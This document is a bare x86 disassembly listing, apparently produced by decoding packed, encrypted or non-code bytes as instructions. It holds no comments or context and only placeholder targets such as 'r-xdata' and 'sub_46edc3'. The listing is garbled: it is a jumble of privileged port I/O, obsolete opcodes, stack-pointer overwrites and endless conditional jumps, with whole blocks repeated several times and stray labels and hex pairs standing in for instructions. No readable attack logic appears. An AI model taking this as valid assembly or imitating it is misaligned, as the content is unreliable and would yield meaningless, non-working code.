jpo r-xdata
jmp r-xdata
jmp r-xdata
adc al 0x7b
lea esp [ edx - 0x52 ]
daa
mov bl 0x81
test [ ecx + 0x628d9e81 ] dh
out 0xeb al
jmp r-xdata
mov dh 0xe7
in al 0x6f
adc al 0x14
adc al 0x7b
jpo r-xdata
jpo r-xdata
adc eax [ edx ]
jpo r-xdata
sub [ ebp - 0x4c0c519e ] ecx
add [ esi - 0xe519d73 ] 0x14362702
adc al 0x7b
jpo r-xdata
std
pushad
jpo r-xdata
loop r-xdata
bound edx [ esi - 0x72ea9fcb ]
bound edx [ esi + 0x214d80b ]
outsd
outsb
sub esp esp
jpo r-xdata
adc al 0x14
add bh ah
jpo r-xdata
adc al 0x14
jpo r-xdata
pop ds
add al [ esi + 0x39 ]
shl [ esi - 0x52 ] cl
pop es
add bh [ ecx + 0x7bebebfd ]
jpo r-xdata
popfd
jpo r-xdata
adc al 0x9e
or eax [ edx ]
int 0xe
scasb [ edi ]
adc al 0x9e
lar ebp [ esi ]
adc al 0x14
shl [ esi + 0x3e6fe4e7 ] cl
adc al 0x14
jpo r-xdata
jpo r-xdata
lds edx [ edx ]
jpo r-xdata
jpo r-xdata
call [ edx ]
in al 0x6f
jpo r-xdata
in al 0x6f
jpo r-xdata
xor al 0x14
adc al 0x81
out dx eax
sub ebx 0xffffffdb
jmp r-xdata
mov al 0x2
retn
adc al 0x14
sub eax [ edx ]
add dl dh
jmp r-xdata
adc al 0x6e
jpo r-xdata
scasb [ edi ]
aas
jpo r-xdata
cmpsb [ esi ] [ edi ]
adc al 0x14
jpo r-xdata
bound ebp [ esi - 0x797e4c0d ]
lea esp [ edx - 0x52 ]
int1
add ah [ edi ]
adc al 0x14
jpo r-xdata
add cl [ ecx ]
out dx al
jmp r-xdata
jpo r-xdata
cmp [ eax + 0x2d ] ah
add al [ edi + 0x7b141418 ]
out dx eax
jmp r-xdata
jpo r-xdata
arpl bx bp
adc al 0x14
stosd [ edi ]
add bl [ ebp + 0xc ]
adc al 0x14
pushad
scasb [ edi ]
pop ss
sahf
xchg esp eax
adc al 0x14
add cl ah
or eax 0x7b7b1414
mov esp 0xe42b6ebf
jmp r-xdata
adc al 0xbc
mov edi 0x6fe42b6e
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
adc al 0x14
mov esp 0x106f6666
adc al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
lea esp [ edx - 0x6a ]
push edi
pushad
adc eax 0x140b5902
adc al 0x7b
lea esp [ edx - 0x52 ]
sbb eax 0xae628db3
adc ebx eax
sub ecx [ ebp - 0x7cee519e ]
out dx eax
0x6e66ebeb 0x106f
jmp r-xdata
mov esp [ eax + 0x33 ]
outsb
xor ah ah
outsd
dec esi
bound ebx [ esi + 0x3b ]
push ss
adc al 0x14
outsb
sub eax [ edx ]
push 0x9
adc al 0x14
jpo r-xdata
outsd
outsb
sub esp esp
bound ebp [ esi + 0x33ec0213 ]
fwait
pop ss
add ah [ eax + 0x7b14140f ]
adc al 0x14
pushad
sub al [ edx ]
salc
jpo r-xdata
adc [ esp ] dl
outsb
xor ebp 0x2bd8ebeb
add al cl
sbb dl [ esp + edx ]
jpo r-xdata
das
jpo r-xdata
jpo r-xdata
jpo r-xdata
pushad
sub eax 0x14188702
adc al 0x7b
bound ebp [ ebp + 0xcc103ef ]
adc al 0x14
jpo r-xdata
int3
jpo r-xdata
adc al 0x14
jpo r-xdata
push cs
jpo r-xdata
call 0xffffffffaea9ea4c
adc esp [ eax - 0x52 ]
pop ss
shr [ esi + 0x12c50213 ] 0x1
xor edi [ edx - 0x25fd547f ]
xor edx [ esp + edx ]
jpo r-xdata
cmpsb [ esi ] [ edi ]
add bh [ ebx + 0x7b141400 ]
jpo r-xdata
add dh [ eax + 0x34 ]
jpo r-xdata
and ch [ eax ]
jpo r-xdata
jpo r-xdata
mov [ 0xffffffffefad62bc ] al
add eax ecx
or al 0x14
adc al 0x83
mov ebp [ esp + ecx * 2 - 0x23 ]
mov esp 0xeb5b6d62
jmp r-xdata
out dx eax
jpo r-xdata
adc al 0x14
jpo r-xdata
adc al 0xe8
sub edi [ ebx - 0x140363fe ]
jmp r-xdata
or dh [ edi ]
adc al 0x14
call 0xffffffff9c49a980
cld
jmp sub_46edc3
jpo r-xdata
add [ esp + edx ] dl
jpo r-xdata
jpo r-xdata
xor al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
outsd
or [ ebx - 0x4322b394 ] 0x62
insd
pop ebx
jmp r-xdata
mov esp 0x3efad62
ror [ esp + edx ] 0x14
pop esp
lodsd [ esi ]
in eax dx
add dl bl
pop ds
adc al 0x14
jpo r-xdata
mov eax 0x1414c802
adc al 0x7b
add cl [ ebx + 0x19 ]
adc al 0x14
in al 0x6e
mov edx 0x60141417
fwait
in al 0x6e
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
aas
adc al 0x14
jpo r-xdata
add dl dh
jmp r-xdata
jpo r-xdata
add dh [ ebp + 0x7bebebf1 ]
jpo r-xdata
adc al 0x7b
jpo r-xdata
jpo r-xdata
jmp r-xdata
push 0x7ee41413
sub ah [ eax + 0x1a ]
adc al 0x38
and eax 0xebf51702
jmp r-xdata
bound ebp [ esi - 0x7b7e4cd9 ]
mov cl 0x81
sahf
lea esp [ edx - 0x52 ]
xor al 0x14
adc al 0x14
sahf
pop ss
mov esp 0xeb637d14
scasb [ edi ]
cmp ebx [ ecx + 0x3cbcb9d ]
sub dh dh
jmp r-xdata
jpo r-xdata
cld
pushfd
jpo r-xdata
jpo r-xdata
push 0x5ce4e903
jecxz r-xdata
jmp r-xdata
clc
call 0xffffffffd932da4d
sub ebp [ ebx + 0x7b7b7b28 ]
jpo r-xdata
xlat
call 0x3e64f209
adc al 0x14
jpo r-xdata
jecxz r-xdata
jpo r-xdata
jmp r-xdata
add bh [ eax - 0x10 ]
jmp sub_46edcb
jpo r-xdata
adc al 0x14
lea esp [ edx - 0x52 ]
xor [ eax + 0x2a ] esp
lea esp [ edx - 0x52 ]
aaa
mov bl 0x81
lds esi [ ecx + eax * 4 - 0x519d7272 ]
xor eax 0xebee8302
jmp r-xdata
call 0xffffffff8d5b011f
bound ebp [ esi - 0x72d59fcf ]
bound ebp [ esi - 0x3a7e4cc9 ]
mov ah 0x81
jmp r-xdata
mov ah 0xb5
mov al 0x22
sub [ ebx + 0x7b ] bh
jpo r-xdata
add ch ah
jpo r-xdata
jpo r-xdata
jpo r-xdata
xor edx [ esp + edx ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
mov ebx 0x207ae66
adc al 0x7b
adc al 0x9d
sti
jpo r-xdata
jpo r-xdata
sub [ ebx + 0x7b ] bh
jpo r-xdata
jpo r-xdata
jpo r-xdata
jo r-xdata
jpo r-xdata
clc
jmp r-xdata
add edi eax
jpo r-xdata
outsb
out 0x3 eax
adc al 0x9e
sub_46ec36
jmp r-xdata
jmp r-xdata
jpo r-xdata
mov ebp 0x7b14140b
jpo r-xdata
jpo r-xdata
outsb
jpo r-xdata
adc al 0x14
jpo r-xdata
adc al 0x7c
pop ds
jmp r-xdata
mov ebp 0xbb02b9bc
outsd
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
mov eax 0x14379e14
jl r-xdata
or ebx eax
adc al 0x2
jmp r-xdata
mov ch 0xf1
mov ebx 0x14e3ae60
adc al 0x14
jpo r-xdata
or al 0x14
adc al 0x7b
jpo r-xdata
outsb
jpo r-xdata
jmp r-xdata
jmp r-xdata
adc al 0x14
adc al 0x7c
pop ss
jmp r-xdata
add cl [ eax + 0x3c ]
add bh ah
mov cl 0x81
jpo r-xdata
adc [ esp + edx ] dl
jpo r-xdata
jpo r-xdata
pop ds
add al [ esi + 0x39 ]
adc al 0x14
loop r-xdata
bound edx [ esi - 0x72ea9fcb ]
bound edx [ esi + 0x214d80b ]
outsd
outsb
sub esp esp
jpo r-xdata
add al ch
jpo r-xdata
mov [ ebp + 0x60fdae62 ] cl
jpo r-xdata
adc al 0xbb
pushad
scasb [ edi ]
jecxz r-xdata
jpo r-xdata
in al 0x6f
jpo r-xdata
call [ edx ]
in al 0x6f
jpo r-xdata
bound ebp [ esi - 0xae8fddb ]
jmp r-xdata
jpo r-xdata
adc dl [ esp + edx ]
jpo r-xdata
bound ebp [ esi - 0x72d69f03 ]
jpo r-xdata
adc al 0x14
jpo r-xdata
mov ebx 0xe42b6ecf
jpo r-xdata
adc al 0x14
adc al 0x14
cld
cmp [ eax + 0x2d ] ah
add al [ edi + 0x7b141418 ]
out dx eax
jmp r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
lea esp [ edx - 0x52 ]
daa
mov bl 0x81
test [ ecx + 0x628d9e81 ] dh
out 0xeb al
jmp r-xdata
mov dh 0xe7
in al 0x6f
adc al 0x14
adc al 0x7b
jpo r-xdata
jpo r-xdata
adc eax [ edx ]
jpo r-xdata
sub [ ebp - 0x4c0c519e ] ecx
add [ esi - 0xe519d73 ] 0x14362702
adc al 0x7b
jpo r-xdata
std
pushad
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
lea esp [ edx - 0x6a ]
push edi
pushad
adc eax 0x140b5902
adc al 0x7b
lea esp [ edx - 0x52 ]
sbb eax 0xae628db3
adc ebx eax
sub ecx [ ebp - 0x7cee519e ]
out dx eax
0x6e66ebeb 0x106f
adc al 0x14
mov esp 0x106f6666
adc al 0x14
jpo r-xdata
shl [ esi - 0x52 ] cl
pop es
add bh [ ecx + 0x7bebebfd ]
jpo r-xdata
popfd
jpo r-xdata
adc al 0x9e
or eax [ edx ]
int 0xe
scasb [ edi ]
adc al 0x9e
lar ebp [ esi ]
adc al 0x14
shl [ esi + 0x3e6fe4e7 ] cl
adc al 0x14
jpo r-xdata
jpo r-xdata
lds edx [ edx ]
jpo r-xdata
jpo r-xdata
das
jpo r-xdata
jpo r-xdata
jpo r-xdata
pushad
sub eax 0x14188702
adc al 0x7b
adc [ esp ] dl
outsb
xor ebp 0x2bd8ebeb
add al cl
sbb dl [ esp + edx ]
jpo r-xdata
xor al 0x14
adc al 0x81
out dx eax
sub ebx 0xffffffdb
jmp r-xdata
mov al 0x2
retn
adc al 0x14
sub eax [ edx ]
add dl dh
jmp r-xdata
adc al 0x6e
jpo r-xdata
scasb [ edi ]
aas
jpo r-xdata
cmpsb [ esi ] [ edi ]
adc al 0x14
jpo r-xdata
bound ebp [ esi - 0x797e4c0d ]
lea esp [ edx - 0x52 ]
int1
add ah [ edi ]
adc al 0x14
jpo r-xdata
add cl [ ecx ]
out dx al
jmp r-xdata
add dh [ eax + 0x34 ]
jpo r-xdata
and ch [ eax ]
jpo r-xdata
jpo r-xdata
add bh [ ebx + 0x7b141400 ]
jpo r-xdata
arpl bx bp
adc al 0x14
stosd [ edi ]
add bl [ ebp + 0xc ]
adc al 0x14
pushad
scasb [ edi ]
pop ss
sahf
xchg esp eax
adc al 0x14
add cl ah
or eax 0x7b7b1414
mov esp 0xe42b6ebf
jmp r-xdata
adc al 0xbc
mov edi 0x6fe42b6e
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
xor al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
outsd
cld
jmp sub_46edc3
jpo r-xdata
add [ esp + edx ] dl
jpo r-xdata
jpo r-xdata
jmp r-xdata
mov esp [ eax + 0x33 ]
outsb
xor ah ah
outsd
dec esi
bound ebx [ esi + 0x3b ]
push ss
adc al 0x14
outsb
sub eax [ edx ]
push 0x9
adc al 0x14
jpo r-xdata
outsd
outsb
sub esp esp
bound ebp [ esi + 0x33ec0213 ]
fwait
pop ss
add ah [ eax + 0x7b14140f ]
adc al 0x14
pushad
sub al [ edx ]
salc
jpo r-xdata
jpo r-xdata
jmp r-xdata
push 0x7ee41413
sub ah [ eax + 0x1a ]
adc al 0x38
jmp r-xdata
jpo r-xdata
add dh [ ebp + 0x7bebebf1 ]
jpo r-xdata
adc al 0x7b
jpo r-xdata
bound ebp [ ebp + 0xcc103ef ]
adc al 0x14
jpo r-xdata
int3
jpo r-xdata
adc al 0x14
jpo r-xdata
push cs
jpo r-xdata
call 0xffffffffaea9ea4c
adc esp [ eax - 0x52 ]
pop ss
shr [ esi + 0x12c50213 ] 0x1
xor edi [ edx - 0x25fd547f ]
xor edx [ esp + edx ]
jpo r-xdata
cmpsb [ esi ] [ edi ]
jmp r-xdata
clc
call 0xffffffffd932da4d
sub ebp [ ebx + 0x7b7b7b28 ]
jpo r-xdata
pushfd
jpo r-xdata
jpo r-xdata
push 0x5ce4e903
jecxz r-xdata
mov [ 0xffffffffefad62bc ] al
add eax ecx
or al 0x14
adc al 0x83
mov ebp [ esp + ecx * 2 - 0x23 ]
mov esp 0xeb5b6d62
jmp r-xdata
out dx eax
jpo r-xdata
adc al 0x14
jpo r-xdata
adc al 0xe8
sub edi [ ebx - 0x140363fe ]
jmp r-xdata
cld
or dh [ edi ]
adc al 0x14
call 0xffffffff9c49a980
jmp r-xdata
mov ah 0xb5
mov al 0x22
sub [ ebx + 0x7b ] bh
jpo r-xdata
add ch ah
jpo r-xdata
aas
adc al 0x14
jpo r-xdata
add dl dh
jmp r-xdata
add bh [ eax - 0x10 ]
jmp sub_46edcb
jpo r-xdata
adc al 0x14
lea esp [ edx - 0x52 ]
xor [ eax + 0x2a ] esp
lea esp [ edx - 0x52 ]
aaa
mov bl 0x81
lds esi [ ecx + eax * 4 - 0x519d7272 ]
xor eax 0xebee8302
jmp r-xdata
call 0xffffffff8d5b011f
bound ebp [ esi - 0x72d59fcf ]
bound ebp [ esi - 0x3a7e4cc9 ]
mov ah 0x81
or [ ebx - 0x4322b394 ] 0x62
insd
pop ebx
jmp r-xdata
mov esp 0x3efad62
ror [ esp + edx ] 0x14
pop esp
lodsd [ esi ]
in eax dx
add dl bl
pop ds
adc al 0x14
jpo r-xdata
mov eax 0x1414c802
adc al 0x7b
add cl [ ebx + 0x19 ]
adc al 0x14
in al 0x6e
mov edx 0x60141417
fwait
in al 0x6e
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
xor edx [ esp + edx ]
jpo r-xdata
jpo r-xdata
and eax 0xebf51702
jmp r-xdata
bound ebp [ esi - 0x7b7e4cd9 ]
mov cl 0x81
sahf
lea esp [ edx - 0x52 ]
xor al 0x14
adc al 0x14
sahf
pop ss
mov esp 0xeb637d14
scasb [ edi ]
cmp ebx [ ecx + 0x3cbcb9d ]
sub dh dh
jmp r-xdata
jpo r-xdata
jpo r-xdata
mov ebx 0x207ae66
adc al 0x7b
adc al 0x9d
jpo r-xdata
jpo r-xdata
xlat
call 0x3e64f209
adc al 0x14
jpo r-xdata
jecxz r-xdata
jpo r-xdata
sti
jpo r-xdata
jpo r-xdata
sub [ ebx + 0x7b ] bh
jpo r-xdata
jpo r-xdata
jpo r-xdata
jo r-xdata
jpo r-xdata
clc
jmp r-xdata
add edi eax
jpo r-xdata
outsb
out 0x3 eax
adc al 0x9e
sub_46ec38
mov bh 0xe2
jmp r-xdata
jpo r-xdata
mov ebp 0x7b14140b
jpo r-xdata
jpo r-xdata
outsb
jpo r-xdata
adc al 0x14
jpo r-xdata
adc al 0x7c
pop ds
jmp r-xdata
mov ebp 0xbb02b9bc
outsd
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
mov eax 0x14379e14
jl r-xdata
or ebx eax
adc al 0x2
jmp r-xdata
mov ch 0xf1
mov ebx 0x14e3ae60
adc al 0x14
jpo r-xdata
or al 0x14
adc al 0x7b
jpo r-xdata
outsb
jpo r-xdata
jmp r-xdata
jmp r-xdata
adc al 0x14
adc al 0x7c
pop ss
jmp r-xdata
add cl [ eax + 0x3c ]
add bh ah
mov cl 0x81
jpo r-xdata
adc [ esp + edx ] dl
jpo r-xdata
jpo r-xdata
pop ds
add al [ esi + 0x39 ]
adc al 0x14
loop r-xdata
bound edx [ esi - 0x72ea9fcb ]
bound edx [ esi + 0x214d80b ]
outsd
outsb
sub esp esp
jpo r-xdata
add al ch
jpo r-xdata
mov [ ebp + 0x60fdae62 ] cl
jpo r-xdata
adc al 0xbb
pushad
scasb [ edi ]
jecxz r-xdata
jpo r-xdata
in al 0x6f
jpo r-xdata
call [ edx ]
in al 0x6f
jpo r-xdata
bound ebp [ esi - 0xae8fddb ]
jmp r-xdata
jpo r-xdata
adc dl [ esp + edx ]
jpo r-xdata
bound ebp [ esi - 0x72d69f03 ]
jpo r-xdata
adc al 0x14
jpo r-xdata
mov ebx 0xe42b6ecf
jpo r-xdata
adc al 0x14
adc al 0x14
cld
cmp [ eax + 0x2d ] ah
add al [ edi + 0x7b141418 ]
out dx eax
jmp r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
lea esp [ edx - 0x52 ]
daa
mov bl 0x81
test [ ecx + 0x628d9e81 ] dh
out 0xeb al
jmp r-xdata
mov dh 0xe7
in al 0x6f
adc al 0x14
adc al 0x7b
jpo r-xdata
jpo r-xdata
adc eax [ edx ]
jpo r-xdata
sub [ ebp - 0x4c0c519e ] ecx
add [ esi - 0xe519d73 ] 0x14362702
adc al 0x7b
jpo r-xdata
std
pushad
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
lea esp [ edx - 0x6a ]
push edi
pushad
adc eax 0x140b5902
adc al 0x7b
lea esp [ edx - 0x52 ]
sbb eax 0xae628db3
adc ebx eax
sub ecx [ ebp - 0x7cee519e ]
out dx eax
0x6e66ebeb 0x106f
adc al 0x14
mov esp 0x106f6666
adc al 0x14
jpo r-xdata
shl [ esi - 0x52 ] cl
pop es
add bh [ ecx + 0x7bebebfd ]
jpo r-xdata
popfd
jpo r-xdata
adc al 0x9e
or eax [ edx ]
int 0xe
scasb [ edi ]
adc al 0x9e
lar ebp [ esi ]
adc al 0x14
shl [ esi + 0x3e6fe4e7 ] cl
adc al 0x14
jpo r-xdata
jpo r-xdata
lds edx [ edx ]
jpo r-xdata
jpo r-xdata
das
jpo r-xdata
jpo r-xdata
jpo r-xdata
pushad
sub eax 0x14188702
adc al 0x7b
adc [ esp ] dl
outsb
xor ebp 0x2bd8ebeb
add al cl
sbb dl [ esp + edx ]
jpo r-xdata
xor al 0x14
adc al 0x81
out dx eax
sub ebx 0xffffffdb
jmp r-xdata
mov al 0x2
retn
adc al 0x14
sub eax [ edx ]
add dl dh
jmp r-xdata
adc al 0x6e
jpo r-xdata
scasb [ edi ]
aas
jpo r-xdata
cmpsb [ esi ] [ edi ]
adc al 0x14
jpo r-xdata
bound ebp [ esi - 0x797e4c0d ]
lea esp [ edx - 0x52 ]
int1
add ah [ edi ]
adc al 0x14
jpo r-xdata
add cl [ ecx ]
out dx al
jmp r-xdata
add dh [ eax + 0x34 ]
jpo r-xdata
and ch [ eax ]
jpo r-xdata
jpo r-xdata
add bh [ ebx + 0x7b141400 ]
jpo r-xdata
arpl bx bp
adc al 0x14
stosd [ edi ]
add bl [ ebp + 0xc ]
adc al 0x14
pushad
scasb [ edi ]
pop ss
sahf
xchg esp eax
adc al 0x14
add cl ah
or eax 0x7b7b1414
mov esp 0xe42b6ebf
jmp r-xdata
adc al 0xbc
mov edi 0x6fe42b6e
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
xor al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
outsd
cld
jmp sub_46edc3
jpo r-xdata
add [ esp + edx ] dl
jpo r-xdata
jpo r-xdata
jmp r-xdata
mov esp [ eax + 0x33 ]
outsb
xor ah ah
outsd
dec esi
bound ebx [ esi + 0x3b ]
push ss
adc al 0x14
outsb
sub eax [ edx ]
push 0x9
adc al 0x14
jpo r-xdata
outsd
outsb
sub esp esp
bound ebp [ esi + 0x33ec0213 ]
fwait
pop ss
add ah [ eax + 0x7b14140f ]
adc al 0x14
pushad
sub al [ edx ]
salc
jpo r-xdata
jpo r-xdata
jmp r-xdata
push 0x7ee41413
sub ah [ eax + 0x1a ]
adc al 0x38
jmp r-xdata
jpo r-xdata
add dh [ ebp + 0x7bebebf1 ]
jpo r-xdata
adc al 0x7b
jpo r-xdata
bound ebp [ ebp + 0xcc103ef ]
adc al 0x14
jpo r-xdata
int3
jpo r-xdata
adc al 0x14
jpo r-xdata
push cs
jpo r-xdata
call 0xffffffffaea9ea4c
adc esp [ eax - 0x52 ]
pop ss
shr [ esi + 0x12c50213 ] 0x1
xor edi [ edx - 0x25fd547f ]
xor edx [ esp + edx ]
jpo r-xdata
cmpsb [ esi ] [ edi ]
jmp r-xdata
clc
call 0xffffffffd932da4d
sub ebp [ ebx + 0x7b7b7b28 ]
jpo r-xdata
pushfd
jpo r-xdata
jpo r-xdata
push 0x5ce4e903
jecxz r-xdata
mov [ 0xffffffffefad62bc ] al
add eax ecx
or al 0x14
adc al 0x83
mov ebp [ esp + ecx * 2 - 0x23 ]
mov esp 0xeb5b6d62
jmp r-xdata
out dx eax
jpo r-xdata
adc al 0x14
jpo r-xdata
adc al 0xe8
sub edi [ ebx - 0x140363fe ]
jmp r-xdata
cld
or dh [ edi ]
adc al 0x14
call 0xffffffff9c49a980
jmp r-xdata
mov ah 0xb5
mov al 0x22
sub [ ebx + 0x7b ] bh
jpo r-xdata
add ch ah
jpo r-xdata
aas
adc al 0x14
jpo r-xdata
add dl dh
jmp r-xdata
add bh [ eax - 0x10 ]
jmp sub_46edcb
jpo r-xdata
adc al 0x14
lea esp [ edx - 0x52 ]
xor [ eax + 0x2a ] esp
lea esp [ edx - 0x52 ]
aaa
mov bl 0x81
lds esi [ ecx + eax * 4 - 0x519d7272 ]
xor eax 0xebee8302
jmp r-xdata
call 0xffffffff8d5b011f
bound ebp [ esi - 0x72d59fcf ]
bound ebp [ esi - 0x3a7e4cc9 ]
mov ah 0x81
or [ ebx - 0x4322b394 ] 0x62
insd
pop ebx
jmp r-xdata
mov esp 0x3efad62
ror [ esp + edx ] 0x14
pop esp
lodsd [ esi ]
in eax dx
add dl bl
pop ds
adc al 0x14
jpo r-xdata
mov eax 0x1414c802
adc al 0x7b
add cl [ ebx + 0x19 ]
adc al 0x14
in al 0x6e
mov edx 0x60141417
fwait
in al 0x6e
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
xor edx [ esp + edx ]
jpo r-xdata
jpo r-xdata
and eax 0xebf51702
jmp r-xdata
bound ebp [ esi - 0x7b7e4cd9 ]
mov cl 0x81
sahf
lea esp [ edx - 0x52 ]
xor al 0x14
adc al 0x14
sahf
pop ss
mov esp 0xeb637d14
scasb [ edi ]
cmp ebx [ ecx + 0x3cbcb9d ]
sub dh dh
jmp r-xdata
jpo r-xdata
jpo r-xdata
mov ebx 0x207ae66
adc al 0x7b
adc al 0x9d
jpo r-xdata
jpo r-xdata
xlat
call 0x3e64f209
adc al 0x14
jpo r-xdata
jecxz r-xdata
jpo r-xdata
sti
jpo r-xdata
jpo r-xdata
sub [ ebx + 0x7b ] bh
jpo r-xdata
jpo r-xdata
jpo r-xdata
jo r-xdata
jpo r-xdata
clc
jmp r-xdata
add edi eax
jpo r-xdata
outsb
out 0x3 eax
adc al 0x9e
sub_46ec3d
jpo r-xdata
jpo r-xdata
jpo r-xdata
call [ edx ]
jpo r-xdata
adc al 0x7d
por mm5 mm3
jmp r-xdata
adc al 0x7c
pop ds
jmp r-xdata
mov ebp 0xbb02b9bc
adc al 0x14
mov esp 0x106f6666
adc al 0x14
jpo r-xdata
out dx eax
sub ebx 0xffffffdb
jmp sub_46ebbc
or ebx eax
adc al 0x2
jmp r-xdata
mov ch 0xf1
outsd
adc [ esp + edx ] dl
mov ebx 0x14e3ae60
mov ebx 0xe42b6ecf
outsd
adc [ esp ] dl
outsb
xor ebp 0x2bd8ebeb
add al cl
sbb dl [ esp + edx ]
jpo r-xdata
adc al 0x14
adc al 0x7c
pop ss
jmp r-xdata
add cl [ eax + 0x3c ]
adc al 0x14
jpo r-xdata
add bh [ ebx + 0x7b141400 ]
jpo r-xdata
loop r-xdata
bound edx [ esi - 0x72ea9fcb ]
bound edx [ esi + 0x214d80b ]
cld
jmp sub_46edc3
jpo r-xdata
add [ esp + edx ] dl
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
add dh [ ebp + 0x7bebebf1 ]
jpo r-xdata
adc al 0x7b
jpo r-xdata
pushfd
jpo r-xdata
jpo r-xdata
push 0x5ce4e903
jecxz r-xdata
add dl dh
aas
adc al 0x14
jpo r-xdata
jmp r-xdata
add bh [ eax - 0x10 ]
jmp sub_46edcb
jpo r-xdata
adc al 0x14
lea esp [ edx - 0x52 ]
xor [ eax + 0x2a ] esp
lea esp [ edx - 0x52 ]
aaa
mov bl 0x81
lds esi [ ecx + eax * 4 - 0x519d7272 ]
xor eax 0xebee8302
jmp r-xdata
call 0xffffffff8d5b011f
bound ebp [ esi - 0x72d59fcf ]
bound ebp [ esi - 0x3a7e4cc9 ]
mov ah 0x81
push cs
jpo r-xdata
jpo r-xdata
jpo r-xdata
scasb [ edi ]
aas
jpo r-xdata
adc al 0xe8
sub edi [ ebx - 0x140363fe ]
jmp r-xdata
cld
or dh [ edi ]
adc al 0x14
call 0xffffffff9c49a980
jmp r-xdata
push 0x7ee41413
sub ah [ eax + 0x1a ]
adc al 0x38
pushad
sub eax 0x14188702
adc al 0x7b
jpo r-xdata
jpo r-xdata
xchg esp eax
adc al 0x14
add cl ah
or eax 0x7b7b1414
mov esp 0xe42b6ebf
jmp r-xdata
adc al 0xbc
mov edi 0x6fe42b6e
jpo r-xdata
adc al 0x7b
call 0xffffffffd932da4d
sub ebp [ ebx + 0x7b7b7b28 ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
sti
jpo r-xdata
jpo r-xdata
outsd
outsb
sub esp esp
bound ebp [ esi + 0x33ec0213 ]
jpo r-xdata
fwait
pop ss
add ah [ eax + 0x7b14140f ]
int3
jpo r-xdata
jpo r-xdata
add ch ah
jpo r-xdata
das
jpo r-xdata
jpo r-xdata
add dh [ eax + 0x34 ]
jpo r-xdata
sub [ ebx + 0x7b ] bh
jpo r-xdata
in al 0x6f
bound ebx [ esi + 0x3b ]
push ss
adc al 0x14
outsb
sub eax [ edx ]
push 0x9
adc al 0x14
jpo r-xdata
popfd
adc al 0x14
jpo r-xdata
xor edx [ esp + edx ]
jpo r-xdata
and ch [ eax ]
jpo r-xdata
jpo r-xdata
adc al 0x14
sub eax [ edx ]
add dl dh
jmp r-xdata
xor al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
cmp [ eax + 0x2d ] ah
add al [ edi + 0x7b141418 ]
bound ebp [ ebp + 0xcc103ef ]
adc al 0x14
jpo r-xdata
scasb [ edi ]
adc al 0x14
mov eax 0x1414c802
adc al 0x7b
add cl [ ebx + 0x19 ]
adc al 0x14
in al 0x6e
mov edx 0x60141417
fwait
in al 0x6e
jpo r-xdata
jpo r-xdata
mov ebx 0x207ae66
adc al 0x7b
adc al 0x9d
jpo r-xdata
jpo r-xdata
jpo r-xdata
out dx eax
jmp r-xdata
outsd
adc al 0x6e
jpo r-xdata
jo r-xdata
jpo r-xdata
add edi eax
mov [ 0xffffffffefad62bc ] al
add eax ecx
or al 0x14
adc al 0x83
mov ebp [ esp + ecx * 2 - 0x23 ]
mov esp 0xeb5b6d62
jmp r-xdata
out dx eax
jpo r-xdata
shl [ esi - 0x52 ] cl
pop es
add bh [ ecx + 0x7bebebfd ]
jpo r-xdata
xor al 0x14
adc al 0x14
sahf
pop ss
mov esp 0xeb637d14
scasb [ edi ]
cmp ebx [ ecx + 0x3cbcb9d ]
sub dh dh
jmp r-xdata
jpo r-xdata
jpo r-xdata
stosd [ edi ]
add bl [ ebp + 0xc ]
adc al 0x14
pushad
scasb [ edi ]
pop ss
call 0xffffffffaea9ea4c
adc esp [ eax - 0x52 ]
pop ss
shr [ esi + 0x12c50213 ] 0x1
adc al 0x14
sahf
jpo r-xdata
mov ah 0xb5
mov al 0x22
sub [ ebx + 0x7b ] bh
or [ ebx - 0x4322b394 ] 0x62
insd
pop ebx
jmp r-xdata
mov esp 0x3efad62
ror [ esp + edx ] 0x14
pop esp
lodsd [ esi ]
in eax dx
add dl bl
pop ds
adc al 0x14
jpo r-xdata
xor al 0x14
adc al 0x81
out dx eax
sub ebx 0xffffffdb
jmp r-xdata
mov al 0x2
retn
mov esp [ eax + 0x33 ]
outsb
xor ah ah
outsd
dec esi
xlat
call 0x3e64f209
adc al 0x14
jpo r-xdata
jecxz r-xdata
jpo r-xdata
jmp r-xdata
clc
jmp r-xdata
clc
bound ebp [ esi - 0xae8fddb ]
jmp r-xdata
jpo r-xdata
outsb
out 0x3 eax
adc al 0x9e
jpo r-xdata
and eax 0xebf51702
jmp r-xdata
bound ebp [ esi - 0x7b7e4cd9 ]
mov cl 0x81
sahf
lea esp [ edx - 0x52 ]
jmp r-xdata
arpl bx bp
jmp r-xdata
adc al 0x7b
lea esp [ edx - 0x52 ]
daa
mov bl 0x81
test [ ecx + 0x628d9e81 ] dh
out 0xeb al
jmp r-xdata
mov dh 0xe7
in al 0x6f
adc al 0x14
adc al 0x9e
lar ebp [ esi ]
adc al 0x14
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
adc al 0x9e
or eax [ edx ]
int 0xe
sub_46ec4c
adc al 0xbd
jecxz r-xdata
jmp r-xdata
imul esi eax 0x7b7bebeb
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7d
por mm5 mm3
jmp r-xdata
adc al 0x7b
jpo r-xdata
jpo r-xdata
adc al 0x14
mov esp 0x106f6666
adc al 0x14
jpo r-xdata
out dx eax
